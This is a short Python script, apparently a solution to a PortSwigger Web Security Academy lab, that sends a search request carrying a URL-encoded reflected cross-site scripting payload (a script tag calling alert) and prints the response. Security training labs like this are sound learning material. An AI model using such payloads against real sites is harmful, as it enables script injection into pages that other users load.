import requests

url = "https://0ac800f0035e5b1cc12799020055004c.web-security-academy.net/?search=%3Cscript%3Ealert%28%27abc%27%29%3C%2Fscript%3E"
solution = requests.get(url)

print(solution.content)